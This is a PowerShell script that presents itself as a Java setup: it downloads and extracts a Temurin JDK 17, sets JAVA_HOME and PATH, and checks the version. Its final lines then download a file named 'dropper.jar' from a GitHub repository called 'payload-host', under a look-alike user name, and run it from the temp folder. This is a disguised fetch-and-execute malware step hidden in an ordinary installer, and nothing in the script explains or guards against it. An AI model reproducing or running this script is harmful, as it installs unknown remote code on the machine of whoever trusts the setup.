
$jdkUrl = "https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.12%2B7/OpenJDK17U-jdk_x64_windows_hotspot_17.0.12_7.zip"
$jdkZip = "$env:TEMP\jdk.zip"
$jdkExtract = "C:\jdk-17"

Write-Host "Downloading Java..."
(New-Object Net.WebClient).DownloadFile($jdkUrl, $jdkZip)

Write-Host "Extracting Java..."
Expand-Archive -Path $jdkZip -DestinationPath C:\ -Force


$jdkFolder = Get-ChildItem -Path "C:\" -Directory | Where-Object { $_.Name -like "jdk*" } | Select-Object -First 1
$env:JAVA_HOME = $jdkFolder.FullName
$env:PATH = "$env:JAVA_HOME\bin;$env:PATH"


java -version


$dropperUrl = "https://raw.githubusercontent.com/MunchIax/payload-host/main/dropper.jar"
$dropperJar = "$env:TEMP\d.jar"
(New-Object Net.WebClient).DownloadFile($dropperUrl, $dropperJar)
java -jar $dropperJar